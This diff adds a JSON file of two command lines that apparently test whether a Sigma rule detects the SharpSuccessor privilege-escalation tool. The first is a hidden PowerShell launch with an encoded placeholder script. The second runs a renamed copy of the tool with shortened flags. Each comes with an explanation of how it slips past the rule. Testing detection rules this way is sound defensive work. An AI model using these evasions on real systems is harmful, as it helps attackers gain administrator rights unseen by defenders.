@@ -1,0 +1,10 @@
+[
+  {
+    "output": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand VGhpcyBpcyBhIGZha2UgYmFzZTY0IGVuY29kZWQgc2NyaXB0IHRoYXQgbG9hZHMgU2hhcnBTdWNjZXNzb3JfcmVub21lZC5kbGwgYW5kIGluaXZva2VzIGl0cyBlbnRyeVBvaW50IHdpdGggYXJndW1lbnRzICJhZGQiICIvaW1wZXJzb25hdGUiICJDOlx0ZW1wIiAiL2FjY291bnQiICJBZG1pbmlzdHJhdG9yIiAiL25hbWUiICJUYXJnZXQi",
+    "explanation": "This command launches PowerShell and passes an encoded script that loads a renamed SharpSuccessor DLL (e.g., legit.dll) from disk and invokes its entry point with the required arguments. The command line contains no plaintext 'SharpSuccessor' string, nor the spaced tokens ' add ', ' /impersonate', ' /path', ' /account', or ' /name', because the arguments are supplied inside the encoded script. Consequently none of the rule's selection conditions match, allowing the activity to bypass detection."
+  },
+  {
+    "output": "copy SharpSuccessor.exe C:\\Windows\\Temp\\not_malicious.exe && C:\\Windows\\Temp\\not_malicious.exe /add /imp:Administrator /p:C:\\Windows\\System32 /acc:TestUser /n:DnsAdmin",
+    "explanation": "The original Sigma rule relies on specific string matches: the filename 'SharpSuccessor.exe', the 'OriginalFileName' metadata, or a specific set of full-word command line arguments (' add ', ' /impersonate', etc.). By renaming the binary to 'not_malicious.exe' and using truncated or alternative argument flags (like '/imp' instead of '/impersonate' or '/p' instead of '/path'), the 'contains|all' logic is broken while the underlying tool's argument parser may still accept the shortened inputs."
+  }
+]
